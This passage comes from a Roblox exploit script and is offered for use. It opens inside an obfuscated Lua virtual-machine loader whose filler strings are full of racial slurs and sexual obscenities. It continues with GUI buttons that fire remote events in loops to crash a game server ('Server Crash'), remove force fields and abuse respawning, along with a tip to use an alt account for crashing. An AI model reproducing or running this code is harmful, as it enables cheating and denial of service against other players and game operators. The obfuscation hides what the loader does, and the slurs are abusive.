l={[(-#'Niggabyte'+(0x5b+-80))]=(function(n)return not(#n==e[(0x5f-93)]())end),[(-#[[balls]]+(515/0x67))]=(function(n)return e[(54-0x31)]()end),[((104+-0x35)+-#'never gonna give you up never gonna let you down')]=(function(n)return e[(1158/0xc1)]()end),[((118-0x5d)+-#[[this is a meme string]])]=(function(n)local l=e[(0x82-124)]()local e=''local n=1 for o=1,#l do n=(n+f)%a e=K(e,F((z(l:sub(o,o))+n)%r))end return e end)};w[3]=e[(0x76-116)]();local n=e[((-#"nicowashere"+(-0x13b6/87))+70)]()for n=1,n do local e=e[((-0x5a+25)+0x43)]();local d;local e=l[e%(-#'Negro'+(81-0x39))];o[n]=e and e({});end;for a=1,e[((0x99-140)+-#"impulse 2022")]()do local n=e[(0x73+-113)]();if(e[((0xd80/48)/18)](n,d,i)==y)then local h=e[(-#'panzerfaust'+(0x74-101))](n,x,B);local l=e[(-55+0x3b)](n,C,x+C);local n={e[((0x3d+-37)+-#[[impulse reel pastebin]])](),e[((0xe1/25)+-#"Faggot")](),nil,nil};local r={[(67-0x43)]=function()n[U]=e[(0x1b-24)]();n[D]=e[((4884/0xde)+-#"Deeznutsbutinlualoo")]();end,[((-41+0x45)+-#'if syn then haxor alert end')]=function()n[_]=e[(66/0x42)]();end,[(82-0x50)]=function()n[b]=e[(-#"this is a meme string"+(0x80-106))]()-(x^v)end,[(84-0x51)]=function()n[k]=e[(0x81/129)]()-(x^v)n[m]=e[(-45+0x30)]();end};r[h]();if(e[(-#'33 cocks in my mouth'+(-0x33+75))](l,i,d)==i)then n[u]=o[n[u]]end if(e[(-#"panzerfaust"+(0x44-53))](l,x,x)==d)then n[c]=o[n[s]]end if(e[((114-0x50)+-#'testing this thingy lololollez')](l,B,B)==i)then n[p]=o[n[m]]end t[a]=n;end end;for e=i,e[(0x1e+-29)]()do h[e-i]=I();end;return w;end;local function g(e,C,O)local v=e[x];local o=e[B];local e=e[d];return(function(...)local y={};local F={};local a=o;local r=e;local l={};local I={...};local e=d e*=-1 local B=e;local o=d;local v=v;local z=j local j=R('#',...)-i;for e=0,j do if(e>=a)then F[e-a]=I[e+i];else l[e]=I[e+d];end;end;local e=j-a+d local e;local a;while true do e=r[o];a=e[(0x72-113)];n=(48922)while a<=(-0x13+61)do n-= n n=(3635244)while(60-0x28)>=a do n-= n n=(6130065)while((-0x10+40)+-#"psx dupe is abd")>=a do n-= n n=(844544)while(42-0x26)>=a do n-= n n=(4373488)while a<=((6120/0x78)-50)do n-= n n=(31416)while(-#'when the he went where when he where where when the he when ther wher he then here went'+(0xee-151))<a do n-= n local i;local a;local n;l[e[t]]=e[s];o=o+d;e=r[o];l[e[h]]=e[s];o=o+d;e=r[o];l[e[f]]=#l[e[_]];o=o+d;e=r[o];l[e[M]]=e[c];o=o+d;e=r[o];n=e[f];a=l[n]i=l[n+2];if(i>0)then if(a>l[n+1])then o=e[U];else l[n+3]=a;end elseif(a<l[n+1])then o=e[k];else l[n+3]=a;end break end while 187==(n)/((-#'testing this thingy lololollez'+(0x1d8-274)))do l[e[w]]=(e[c]~=0);break end;break;end while 1904==(n)/((0x88d54/244))do n=(1546626)while(0x40+-62)>=a do n-= n O[e[b]]=l[e[f]];break;end while(n)/((0x2ffec/98))==771 do n=(11739342)while(582/0xc2)<a do n-= n local n=e[M];local d=l[n]local a=l[n+2];if(a>0)then if(d>l[n+1])then o=e[_];else l[n+3]=d;end elseif(d<l[n+1])then o=e[U];else l[n+3]=d;end break end while(n)/((0x1b45-3515))==3387 do if(l[e[w]]~=e[L])then o=o+i;else o=e[b];end;break end;break;end break;end break;end while(n)/((0x9b723/193))==256 do n=(2456304)while a<=(-#"0 divided by 0"+(0x60-76))do n-= n n=(9724305)while a>(110/0x16)do n-= n local a;local w,x;local i;local n;l[e[M]]=O[e[s]];o=o+d;e=r[o];n=e[h];i=l[e[_]];l[n+1]=i;l[n]=i[e[P]];o=o+d;e=r[o];l[e[t]]=O[e[s]];o=o+d;e=r[o];l[e[h]]=e[b];o=o+d;e=r[o];l[e[u]]=e[c];o=o+d;e=r[o];l[e[M]]=e[_];o=o+d;e=r[o];n=e[h]l[n]=l[n](N(l,n+d,e[U]))o=o+d;e=r[o];l[e[t]]=(e[s]~=0);o=o+d;e=r[o];n=e[h]w,x=z(l[n](N(l,n+1,e[b])))B=x+n-1 a=0;for e=n,B do a=a+d;l[e]=w[a];end;o=o+d;e=r[o];n=e[f]l[n]=l[n](N(l,n+d,B))break end while(n)/((0x16b2-(0x9b24e/218)))==3359 do if not l[e[t]]then o=o+i;else o=e[k];end;break end;break;end while 701==(n)/((0x1ba3-3571))do n=(2983684)while a<=(-#[[cilerteddoesntlikeburgers]]+(-97+0x81))do n-= n l[e[f]]=e[U];break;end while(n)/((54340/0x41))==3569 do n=(386015)while(-#"freerobuxphone"+(-118+(16240/0x74)))<a do n-= n l[e[h]]();break end while(n)/((-0x29+1924))==205 do if not l[e[w]]then o=o+i;else o=e[k];end;break end;break;end break;end break;end break;end while(n)/((2092+-0x25))==2983 do n=(1200906)while a<=(-0x69+119)do n-= n n=(9101015)while a<=(605/0x37)do n-= n n=(6269136)while(37-0x1b)<a do n-= n local e={l,e};e[i][e[x][t]]=e[d][e[x][P]]+e[i][e[x][s]];break end while 2991==(n)/((77552/0x25))do l[e[h]]=O[e[k]];break end;break;end while 2695==(n)/(((0x358b-6865)-3465))do n=(1645548)while(0x70-100)>=a do n-= n local e=e[f]l[e]=l[e](l[e+i])break;end while(n)/((-0x68+827))==2276 do n=(10516110)while a>(0x1f+-18)do n-= n l[e[h]]=l[e[b]][e[S]];break end while 2897==(n)/(((662298/0xb6)+-#'0nly segc'))do local n=e[w]l[n]=l[n](N(l,n+d,e[k]))break end;break;end break;end break;end while(n)/((788+-0x52))==1701 do n=(8650950)while(3774/0xde)>=a do n-= n n=(1094176)while(0x63-84)>=a do n-= n do return l[e[u]]end break;end while 496==(n)/((476496/0xd8))do n=(2295284)while(0x87-119)<a do n-= n C[e[_]]=l[e[w]];break end while 964==(n)/((0x46eb2/(-82+0xcc)))do local e=e[w]l[e]=l[e](l[e+i])break end;break;end break;end while(n)/((((-0xf+-70)+2409)+-#"dies of cringe"))==3745 do n=(471536)while((-1185/0xf)+0x61)>=a do n-= n local n=e[t]local o,e=z(l[n](N(l,n+1,e[U])))B=e+n-1 local e=0;for n=n,B do e=e+d;l[n]=o[e];end;break;end while 2267==(n)/((241+-0x21))do n=(458250)while(-107+0x7e)<a do n-= n do return l[e[t]]end break end while(n)/(((55750/0xdf)+-#[[howtodumpscript]]))==1950 do l[e[w]][l[e[c]]]=l[e[D]];break end;break;end break;end break;end break;end break;end while 1446==(n)/((2558+-0x2c))do n=(104400)while a<=((0xca-152)+-#[[Deeznutsbutinlualoo]])do n-= n n=(5918635)while(0x5f+-70)>=a do n-= n n=(1829434)while a<=(0xeb2/171)do n-= n n=(5193120)while a>(-#[[free bobux no skem]]+(-123+0xa2))do n-= n l[e[t]]=C[e[b]];o=o+d;e=r[o];l[e[w]]=#l[e[b]];o=o+d;e=r[o];C[e[s]]=l[e[t]];o=o+d;e=r[o];l[e[t]]=C[e[s]];o=o+d;e=r[o];l[e[f]]=#l[e[c]];o=o+d;e=r[o];C[e[_]]=l[e[M]];o=o+d;e=r[o];do return end;break end while 1745==(n)/((127968/0x2b))do l[e[f]]=(e[b]~=0);o=o+i;break end;break;end while(n)/((-103+0x501))==1553 do n=(299712)while a<=(1610/0x46)do n-= n local n=l[e[p]];if not n then o=o+i;else l[e[t]]=n;o=e[c];end;break;end while 192==(n)/((96782/0x3e))do n=(152900)while a>((0xb13/81)+-#[[nicowashere]])do n-= n l[e[w]]=#l[e[U]];break end while(n)/((0x81-79))==3058 do if(l[e[t]]~=l[e[p]])then o=o+i;else o=e[b];end;break end;break;end break;end break;end while 1945==(n)/((-#'keno 0347 is a nerdy fag'+(0x182b-3120)))do n=(7430160)while(0x8a4/79)>=a do n-= n n=(126250)while(-#'W4rboy was here'+(-16+0x39))>=a do n-= n C[e[s]]=l[e[M]];break;end while(n)/((222-0x79))==1250 do n=(724302)while((0x86-83)+-#[[big niggers sucking cock]])<a do n-= n local e=e[t]l[e]=l[e](N(l,e+d,B))break end while 918==(n)/((33138/(0x2514/226)))do l[e[u]]=l[e[k]]%e[m];break end;break;end break;end while 2984==(n)/(((0x1415-2631)+-#'sex in fortnite real'))do n=(3379968)while a<=(-#"10 black dicks in your mouth"+((3482+-0x3e)/0x3c))do n-= n if(l[e[t]]==l[e[S]])then o=o+i;else o=e[c];end;break;end while(n)/((0x7075e/157))==1152 do n=(956685)while(3660/0x7a)<a do n-= n l[e[f]]=l[e[b]]-l[e[P]];break end while 295==(n)/(((0x3e0fa/78)+-#'Fucking Retarted'))do do return end;break end;break;end break;end break;end break;end while 144==(n)/((0x3025/17))do n=(4108050)while a<=(-#"impulse loves moonsex"+(11628/0xcc))do n-= n n=(3517480)while a<=((209-0x9f)+-#[[Impulse real 2022]])do n-= n n=(2333448)while a>((-97+0x8d)+-#'mike litoris')do n-= n if(l[e[w]]==l[e[L]])then o=o+i;else o=e[k];end;break end while 648==(n)/((0x1c3a-(-#[[testing this thingy lololollez]]+(0x1cbb-3700))))do local a=v[e[s]];local d;local n={};d=A({},{__index=function(o,e)local e=n[e];return e[1][e[2]];end,__newindex=function(l,e,o)local e=n[e]e[1][e[2]]=o;end;});for d=1,e[p]do o=o+i;local e=r[o];if e[(-#"algebra"+(0x558/171))]==74 then n[d-1]={l,e[s]};else n[d-1]={C,e[c]};end;y[#y+1]=n;end;l[e[w]]=g(a,d,O);break end;break;end while 940==(n)/((0xe464c/250))do n=(471257)while(-#'psx real dupe steal all ur pets no joke'+(0x8f+-70))>=a do n-= n l[e[f]]=l[e[b]]%e[p];break;end while 323==(n)/((0xb7f-1484))do n=(4779620)while a>(0x1a86/194)do n-= n local e=e[f]l[e](l[e+i])break end while 1765==(n)/(((0x35110/80)+-#'Niggabyte'))do if l[e[t]]then o=o+d;else o=e[s];end;break end;break;end break;end break;end while 1530==(n)/((365160/0x88))do n=(197030)while a<=(155+-0x74)do n-= n n=(10621272)while a<=(0xab-134)do n-= n local n=e[u];local a=l[n+2];local d=l[n]+a;l[n]=d;if(a>0)then if(d<=l[n+1])then o=e[b];l[n+3]=d;end elseif(d>=l[n+1])then o=e[U];l[n+3]=d;end break;end while(n)/((518748/0x8b))==2846 do n=(2919370)while a>(-#[[holy shit]]+(0xa7+-120))do n-= n local e=e[h]l[e](l[e+i])break end while(n)/(((2755-0x597)+-#'Ur mom'))==2215 do O[e[_]]=l[e[u]];break end;break;end break;end while(n)/((682-((794-0x197)+-#"send nudes")))==646 do n=(8879538)while a<=(-#"holy shit"+(0x80+-79))do n-= n l[e[u]]=l[e[U]]-l[e[S]];break;end while 2802==(n)/(((-#"kys nigga"+(-17+-0x55))+0xcd0))do n=(98566)while a>(-#[[big niggers sucking cock]]+(-0x4f+144))do n-= n l[e[h]]=e[U];break end while(n)/((-0x6e+333))==442 do if(l[e[M]]~=e[D])then o=o+i;else o=e[_];end;break end;break;end break;end break;end break;end break;end break;end while(n)/((12749/0xd1))==802 do n=(234320)while a<=(0x2000/128)do n-= n n=(1264236)while(-#"deadphonelua"+(0x34d0/208))>=a do n-= n n=(56250)while(-22+0x45)>=a do n-= n n=(2542605)while(-#'never gonna give you up never gonna let you down'+(0x3b4c/165))>=a do n-= n n=(4626312)while a>(3526/0x52)do n-= n local a;local n;l[e[w]]=(e[k]~=0);o=o+d;e=r[o];l[e[w]]=l[e[_]];o=o+d;e=r[o];l[e[h]]=O[e[k]];o=o+d;e=r[o];n=e[h]l[n]=l[n](l[n+i])o=o+d;e=r[o];a=l[e[D]];if not a then o=o+i;else l[e[u]]=a;o=e[k];end;break end while 2958==(n)/((0x678+(-0x28+-52)))do local n=e[u];local d=l[n]local a=l[n+2];if(a>0)then if(d>l[n+1])then o=e[k];else l[n+3]=d;end elseif(d<l[n+1])then o=e[s];else l[n+3]=d;end break end;break;end while 885==(n)/((591838/0xce))do n=(5032051)while(9675/0xd7)>=a do n-= n l[e[M]]();break;end while(n)/((-#'dies of cringe'+(5991-0xbdc)))==1711 do n=(4909333)while(0x29b0/232)<a do n-= n local o=e[c];local n=l[o]for e=o+1,e[D]do n=n..l[e];end;l[e[w]]=n;break end while(n)/((-31+0xc50))==1573 do l[e[f]]=O[e[k]];break end;break;end break;end break;end while(n)/((0x7d-80))==1250 do n=(9207635)while((9499/0xa1)+-#[[Niggabyte]])>=a do n-= n n=(5031018)while((5452/0x5e)+-#[[send nudes]])>=a do n-= n o=e[U];break;end while 1851==(n)/((-#"Impulse youtube real"+(0x159c-2794)))do n=(2769340)while a>((0xa0+-101)+-#'bigchungus')do n-= n l[e[h]]=C[e[s]];break end while 1834==(n)/(((1614+-0x3b)+-#'testpsx dupe no scam legit 2022 free no virus'))do local a;local n;l[e[M]]=O[e[U]];o=o+d;e=r[o];l[e[w]]=O[e[k]];o=o+d;e=r[o];l[e[M]]=e[U];o=o+d;e=r[o];l[e[f]]=e[b];o=o+d;e=r[o];l[e[f]]=e[c];o=o+d;e=r[o];n=e[u]l[n]=l[n](N(l,n+d,e[k]))o=o+d;e=r[o];l[e[w]]=l[e[U]][l[e[m]]];o=o+d;e=r[o];n=e[t]l[n]=l[n](l[n+i])o=o+d;e=r[o];a=l[e[p]];if not a then o=o+i;else l[e[f]]=a;o=e[c];end;break end;break;end break;end while 2627==(n)/(((7078-0xde9)+-#"impulse 2022"))do n=(5812020)while(0xa8+-117)>=a do n-= n local o=e[U];local n=l[o]for e=o+1,e[L]do n=n..l[e];end;l[e[u]]=n;break;end while(n)/((-88+0xb14))==2115 do n=(10818080)while(11492/0xdd)<a do n-= n local n=l[e[D]];if not n then o=o+i;else l[e[f]]=n;o=e[c];end;break end while 2972==(n)/((0x1cd7-3743))do l[e[h]]=l[e[U]][e[S]];break end;break;end break;end break;end break;end while 3076==(n)/((924-0x201))do n=(5828370)while(8584/0x94)>=a do n-= n n=(3790176)while a<=(0x2ed6/218)do n-= n n=(8442720)while(0xba-132)<a do n-= n l[e[u]]=l[e[c]][l[e[D]]];break end while 2145==(n)/((0x1ee9-3977))do local n;local a;l[e[u]]=O[e[s]];o=o+d;e=r[o];l[e[h]]=e[c];o=o+d;e=r[o];l[e[t]]=e[s];o=o+d;e=r[o];a=e[c];n=l[a]for e=a+1,e[P]do n=n..l[e];end;l[e[u]]=n;o=o+d;e=r[o];if not l[e[h]]then o=o+i;else o=e[U];end;break end;break;end while 1248==(n)/((583104/0xc0))do n=(12150284)while(-#[[Lana Rhoades]]+(3808/0x38))>=a do n-= n l[e[h]]=g(v[e[b]],nil,O);break;end while 3673==(n)/((6651-0xd0f))do n=(696213)while(184-0x7f)<a do n-= n local n=e[h]l[n]=l[n](N(l,n+d,e[c]))break end while 387==(n)/((1875+-0x4c))do l[e[u]]={};break end;break;end break;end break;end while(n)/((-#'mf stfu'+(0x1acd-3485)))==1730 do n=(2174926)while(-124+0xb9)>=a do n-= n n=(11894131)while(176-0x75)>=a do n-= n local e={l,e};e[d][e[x][u]]=e[x][S]+e[x][k];break;end while(n)/((-#[[nerd]]+((-93+0x1e5d)-3865)))==3121 do n=(1098750)while a>((256-0x9d)+-#[[papier ist ein kleiner schwanz lutscher]])do n-= n if(l[e[u]]~=l[e[D]])then o=o+i;else o=e[U];end;break end while(n)/(((1268-0x2a1)+-#[[kys nigga]]))==1875 do l[e[t]]=l[e[_]][l[e[S]]];break end;break;end break;end while 3637==(n)/((0x4d1-635))do n=(3120794)while(-#'impulse 2022'+(182+-0x6c))>=a do n-= n l[e[M]]=l[e[b]];break;end while 3214==(n)/((-0x7a+1093))do n=(6136500)while(0xbc-125)<a do n-= n do return end;break end while(n)/((3073-0x625))==4091 do local a;local n;l[e[t]]=O[e[U]];o=o+d;e=r[o];l[e[f]]=O[e[b]];o=o+d;e=r[o];l[e[w]]=e[U];o=o+d;e=r[o];l[e[u]]=e[_];o=o+d;e=r[o];l[e[M]]=e[s];o=o+d;e=r[o];n=e[f]l[n]=l[n](N(l,n+d,e[_]))o=o+d;e=r[o];l[e[M]]=l[e[_]][l[e[m]]];o=o+d;e=r[o];n=e[w]l[n]=l[n](l[n+i])o=o+d;e=r[o];a=l[e[D]];if not a then o=o+i;else l[e[t]]=a;o=e[c];end;break end;break;end break;end break;end break;end break;end while 290==(n)/(((103500/0x7d)+-#[[sex in fortnite real]]))do n=(1617000)while a<=(0x3e67/213)do n-= n n=(618690)while(4761/0x45)>=a do n-= n n=(2872320)while(167+-0x65)>=a do n-= n n=(1379730)while((0x121-((0xed+-26)+-#'panzerfaust'))+-#"moonsec got deobfuscated")<a do n-= n l[e[f]]=(e[c]~=0);o=o+i;break end while(n)/((3390/0x3))==1221 do local e={l,e};e[d][e[x][h]]=e[x][p]+e[x][s];break end;break;end while(n)/((1996+-0x4c))==1496 do n=(4355211)while a<=(0x98-85)do n-= n local a;local n;l[e[f]]=O[e[s]];o=o+d;e=r[o];l[e[h]]=O[e[c]];o=o+d;e=r[o];l[e[M]]=e[s];o=o+d;e=r[o];l[e[h]]=e[c];o=o+d;e=r[o];l[e[w]]=e[c];o=o+d;e=r[o];n=e[t]l[n]=l[n](N(l,n+d,e[b]))o=o+d;e=r[o];l[e[u]]=l[e[c]][l[e[m]]];o=o+d;e=r[o];n=e[t]l[n]=l[n](l[n+i])o=o+d;e=r[o];a=l[e[S]];if not a then o=o+i;else l[e[u]]=a;o=e[U];end;break;end while(n)/((-80+0xabb))==1633 do n=(6338591)while a>((176-0x63)+-#'0nly 1337')do n-= n o=e[U];break end while(n)/((-#[[If LocalPlayer equals Dumbass then while true do end]]+(0x1a36-3389)))==1939 do l[e[h]]=#l[e[c]];break end;break;end break;end break;end while(n)/((0x321a8/136))==410 do n=(4630080)while(-#[[holy shit]]+(0x47d3/227))>=a do n-= n n=(9918032)while(-75+0x91)>=a do n-= n l[e[h]]=(e[k]~=0);break;end while 3463==(n)/((5844-0xba4))do n=(3833466)while a>(11076/0x9c)do n-= n local U;local a;local k;local n;l[e[t]]=O[e[b]];o=o+d;e=r[o];l[e[f]]=l[e[s]][e[P]];o=o+d;e=r[o];n=e[u];k=l[e[c]];l[n+1]=k;l[n]=k[e[P]];o=o+d;e=r[o];l[e[h]]=l[e[c]];o=o+d;e=r[o];l[e[u]]=l[e[c]];o=o+d;e=r[o];n=e[h]l[n]=l[n](N(l,n+d,e[s]))o=o+d;e=r[o];n=e[M];k=l[e[_]];l[n+1]=k;l[n]=k[e[D]];o=o+d;e=r[o];n=e[h]l[n]=l[n](l[n+i])o=o+d;e=r[o];a={l,e};a[i][a[x][M]]=a[d][a[x][S]]+a[i][a[x][b]];o=o+d;e=r[o];l[e[h]]=l[e[_]]%e[P];o=o+d;e=r[o];n=e[w]l[n]=l[n](l[n+i])o=o+d;e=r[o];k=e[c];U=l[k]for e=k+1,e[L]do U=U..l[e];end;l[e[u]]=U;o=o+d;e=r[o];a={l,e};a[i][a[x][f]]=a[d][a[x][P]]+a[i][a[x][b]];o=o+d;e=r[o];l[e[t]]=l[e[b]]%e[P];break end while(n)/((427278/0x8e))==1274 do local n=e[M];local o=l[e[b]];l[n+1]=o;l[n]=o[e[S]];break end;break;end break;end while 3180==(n)/((-0x35+1509))do n=(1904952)while(0xbb-114)>=a do n-= n local o=e[h];local n=l[e[k]];l[o+1]=n;l[o]=n[e[D]];break;end while(n)/((-0x2c+4046))==476 do n=(7000668)while a>((-104+0xbd)+-#[[nicowashere]])do n-= n l[e[t]]=C[e[b]];break end while(n)/((0xea3-1911))==3813 do l[e[w]]=l[e[c]];break end;break;end break;end break;end break;end while 825==(n)/((495880/0xfd))do n=(1695522)while a<=(0x105-181)do n-= n n=(130494)while a<=(-#"Impulse youtube ez"+(159+-0x40))do n-= n n=(3352775)while(14136/0xba)<a do n-= n O[e[c]]=l[e[f]];o=o+d;e=r[o];l[e[u]]={};o=o+d;e=r[o];l[e[w]]={};o=o+d;e=r[o];O[e[c]]=l[e[t]];o=o+d;e=r[o];l[e[h]]=O[e[U]];o=o+d;e=r[o];if(l[e[M]]~=e[P])then o=o+i;else o=e[b];end;break end while(n)/((1147+-0x7a))==3271 do local e=e[w]l[e]=l[e](N(l,e+d,B))break end;break;end while(n)/((3457-0x6f8))==78 do n=(1554598)while(211-0x85)>=a do n-= n local e={l,e};e[i][e[x][M]]=e[d][e[x][P]]+e[i][e[x][b]];break;end while 857==(n)/((0x737+-33))do n=(4731408)while(-#"nerd"+(0xac+-89))<a do n-= n local n=e[t]local o,e=z(l[n](N(l,n+1,e[_])))B=e+n-1 local e=0;for n=n,B do e=e+d;l[n]=o[e];end;break end while 2552==(n)/((3817-0x7ab))do if l[e[h]]then o=o+d;else o=e[_];end;break end;break;end break;end break;end while 417==(n)/((8178-0x1010))do n=(10707729)while(-#[[keno 0347 is a nerdy fag]]+(0x5ab3/217))>=a do n-= n n=(4631032)while(4455/0x37)>=a do n-= n l[e[t]]=g(v[e[_]],nil,O);break;end while(n)/((0x3b959/121))==2296 do n=(3599064)while(-#'i bought a boost for this string'+(207+-0x5d))<a do n-= n local a=v[e[k]];local d;local n={};d=A({},{__index=function(o,e)local e=n[e];return e[1][e[2]];end,__newindex=function(l,e,o)local e=n[e]e[1][e[2]]=o;end;});for d=1,e[D]do o=o+i;local e=r[o];if e[(-#[[this is a meme string]]+(3784/0xac))]==74 then n[d-1]={l,e[c]};else n[d-1]={C,e[b]};end;y[#y+1]=n;end;l[e[w]]=g(a,d,O);break end while 2664==(n)/((0x307c5/147))do l[e[u]][l[e[s]]]=l[e[P]];break end;break;end break;end while 3769==(n)/((0x1674-2907))do n=(2557796)while(0x38c4/173)>=a do n-= n local n=e[u];local a=l[n+2];local d=l[n]+a;l[n]=d;if(a>0)then if(d<=l[n+1])then o=e[k];l[n+3]=d;end elseif(d>=l[n+1])then o=e[b];l[n+3]=d;end break;end while 3923==(n)/((-#"Impulse real 2022"+(86970/0x82)))do n=(2354220)while((0x12f0/48)+-#"0nly was here mf")<a do n-= n local n;l[e[t]]=O[e[k]];o=o+d;e=r[o];l[e[f]]=O[e[c]];o=o+d;e=r[o];l[e[h]]=e[s];o=o+d;e=r[o];l[e[w]]=e[k];o=o+d;e=r[o];l[e[h]]=e[k];o=o+d;e=r[o];n=e[M]l[n]=l[n](N(l,n+d,e[k]))o=o+d;e=r[o];l[e[u]]=l[e[c]][l[e[m]]];o=o+d;e=r[o];n=e[f]l[n]=l[n](l[n+i])o=o+d;e=r[o];l[e[t]]=l[e[c]];o=o+d;e=r[o];o=e[k];break end while 1044==(n)/((0x2db1d/(-0x2b+126)))do l[e[M]]={};break end;break;end break;end break;end break;end break;end break;end o+= i end;end);end;return g(I(),{},E())()end)_msec({[(388-0xdb)]='\115\116'..(function(e)return(e and'قكؠدسڪضححؠقج')or'\114\105'or'\120\58'end)((-#"impulse is hot"+(95-0x4c))==(0x62+-92))..'\110g',["ڪآقآقحدن"]='\108\100'..(function(e)return(e and'نكنټ؃ڪڪ؃دؠڝڝ')or'\101\120'or'\119\111'end)((0x51+(12+-0x58))==(0x42+-60))..'\112',["نضحؠكزؠسججئآئ"]=(function(e)return(e and'ڪزكدنحآنكئق؃نؠسنؠڝؠ')and'\98\121'or'\100\120'end)((-#'keno 0347 is a nerdy fag'+(46+(51-0x44)))==(450/0x5a))..'\116\101',["ڪنڪسئڝټئسڝڪڝضززحڝ"]='\99'..(function(e)return(e and'قنسڪجآحزكندج')and'\90\19\157'or'\104\97'end)(((0x41d+-98)/0xbf)==(0x1d4/156))..'\114',[(0x4d2-643)]='\116\97'..(function(e)return(e and'ئدنڪك؃ڝڝزڪڝسجككآحق')and'\64\113'or'\98\108'end)((-#'0 divided by 0'+(0x31+-29))==(0x479/229))..'\101',["جڝجنئؠټح"]=(function(e)return(e and'دننجحڝڝجئڝڝج')or'\115\117'or'\78\107'end)((-#"niggers"+(270/0x1b))==(6045/0xc3))..'\98',["سدئ؃ڪحضنحئضئؠئڝئئج"]='\99\111'..(function(e)return(e and'نټآ؃ححسزڪحڝضقؠڝټضڪ')and'\110\99'or'\110\105\103\97'end)(((4477/((0x17e-252)+-#[[Crackzzzz]]))+-#"Ur mom")==(-#"alivephoneluaLMAO"+(720/0xf)))..'\97\116',[(-#'made by kim jong un'+(777+-0x45))]=(function(e,n)return(e and'جؠسڝټآ؃زڝئد؃كسك')and'\48\159\158\188\10'or'\109\97'end)((-#"bigchungus"+(64+-0x31))==(-#"deadphonelua"+(0xb88/164)))..'\116\104',[(0xa79-1353)]=(function(n,e)return((-122+((0x82e8/236)+-#"psx dupe is abd"))==((84+-0x3e)+-#'how to join the kkk')and'\48'..'\195'or n..((not'\20\95\69'and'\90'..'\180'or e)))or'\199\203\95'end),["؃ضككنڪدئ"]='\105\110'..(function(e,n)return(e and'ئ؃ضڪئزحڝدڪكز')and'\90\115\138\115\15'or'\115\101'end)(((0x6a+-92)+-#'arab porn')==((-0x4f+130)+-#"Impulse youtube real"))..'\114\116',["سحئقڪآآضڝسجح"]='\117\110'..(function(e,n)return(e and'زجحضضڝؠزقنئض؃')or'\112\97'or'\20\38\154'end)((175/0x23)==(0x1b9c/228))..'\99\107',["د؃كقق؃ضك"]='\115\101'..(function(e)return(e and'ڪڪؠټندحق؃ڝئ؃ؠض؃ڝجآ')and'\110\112\99\104'or'\108\101'end)(((-0x3e+96)+-#[[Obfuscated By Obamas Left Nut]])==(4433/0x8f))..'\99\116',["سنټجزئحآ؃آزضڝكآجضكس"]='\116\111\110'..(function(e,n)return(e and'سد؃نڪكحآڝحؠدكض؃جق')and'\117\109\98'or'\100\97\120\122'end)((-17+0x16)==(133-(-#[[Deeznutsbutinlualoo]]+(0x6e4/12))))..'\101\114'},{["ئحؠضسزن؃ڪڝضزئزز"]=((getfenv))},((getfenv))()) end)()



    
    end)

UICorner_4.Parent = TextButton_2

TextButton_3.Parent = GiveAllRepFrame
TextButton_3.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
TextButton_3.Position = UDim2.new(0.546555042, 0, 0.732620358, 0)
TextButton_3.Size = UDim2.new(0, 192, 0, 78)
TextButton_3.Font = Enum.Font.Sarpanch
TextButton_3.Text = "Server Crash"
TextButton_3.TextColor3 = Color3.fromRGB(0, 0, 0)
TextButton_3.TextSize = 40.000
TextButton_3.TextStrokeTransparency = 0.800

TextButton_3.MouseButton1Click:Connect(function()

shared.io = game:GetService('RunService').RenderStepped:Connect(function()
    for i,v in pairs(game.Players:GetPlayers()) do
        pcall(function()
    local children = game.Players.LocalPlayer.Character:GetChildren()
    for i, child in ipairs(children) do
        if child.Name == "KillingIntentPart" then
            child.Effect.Enabled = false
    local args = {
        [1] = {
            [1] = "Skill_KillingIntent_Start"
        }
    }

    game:GetService("ReplicatedStorage").RemoteEvent:FireServer(unpack(args))

        end
    end
    end)
    end
end)

game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-2546, 912993333, 1450)

shared.io = game:GetService('RunService').RenderStepped:Connect(function()
for _,plr in pairs(game.Players:GetPlayers()) do
pcall(function()
for _,obj in pairs(plr.Character.Head:GetChildren()) do
if obj:IsA("Sound") then
obj:Stop()
end
end
end)
end
end
)
wait(0.2)

local BUSCO = game.Players.LocalPlayer.Character:FindFirstChildOfClass("ForceField")
if BUSCO then
    game.Players.LocalPlayer.Character.ForceField:remove()
    return
end

wait(0.1)

local args = {
    [1] = {
        [1] = "Skill_KillingIntent_Start"
    }
}

game:GetService("ReplicatedStorage").RemoteEvent:FireServer(unpack(args))
wait(1)
game.Players.LocalPlayer.Character.Head:destroy()

--works better if u have an alt 2 crash and a main that kills it after a few secs!

end)

UICorner_5.Parent = TextButton_3

TextButton_4.Parent = GiveAllRepFrame
TextButton_4.BackgroundColor3 = Color3.fromRGB(0, 0, 255)
TextButton_4.Position = UDim2.new(0.546555161, 0, 0.234978765, 0)
TextButton_4.Size = UDim2.new(0, 192, 0, 79)
TextButton_4.Font = Enum.Font.Sarpanch
TextButton_4.Text = "Auto Remove FF"
TextButton_4.TextColor3 = Color3.fromRGB(0, 0, 0)
TextButton_4.TextSize = 30.000
TextButton_4.TextStrokeTransparency = 0.800

TextButton_4.MouseButton1Click:Connect(function()

repeat
wait()
until game:IsLoaded()
wait()

game.Players.LocalPlayer.CharacterAdded:Connect(function()
local RunService = game:GetService("RunService")
RunService.Heartbeat:Connect(function(step)                                  
                                     
                                      if game.Players.LocalPlayer.Character:FindFirstChild("ForceField") then
                                game.Players.LocalPlayer.Character:FindFirstChild("ForceField"):Destroy()
                                      end
end
                    )
end
   )


end)

UICorner_6.Parent = TextButton_4

TextButton_5.Parent = GiveAllRepFrame
TextButton_5.BackgroundColor3 = Color3.fromRGB(0, 0, 255)
TextButton_5.Position = UDim2.new(0.0569695532, 0, 0.473186374, 0)
TextButton_5.Size = UDim2.new(0, 191, 0, 78)
TextButton_5.Font = Enum.Font.Sarpanch
TextButton_5.Text = "Respawning While Fight"
TextButton_5.TextColor3 = Color3.fromRGB(0, 0, 0)
TextButton_5.TextSize = 20.000
TextButton_5.TextStrokeTransparency = 0.800

TextButton_5.MouseButton1Click:Connect(function()

while true do
    task.wait(0.1)
    local args = {
    [1] = {
        [1] = "Respawn"
    }
}

game:GetService("ReplicatedStorage").RemoteEvent:FireServer(unpack(args))
wait(2.7)
if game.Players.LocalPlayer.Character:FindFirstChild("ForceField") then
                                game.Players.LocalPlayer.Character:FindFirstChild("ForceField"):Destroy()
end
end


end)


UICorner_7.Parent = TextButton_5

TextButton_6.Parent = GiveAllRepFrame
TextButton_6.BackgroundColor3 = Color3.fromRGB(0, 0, 255)
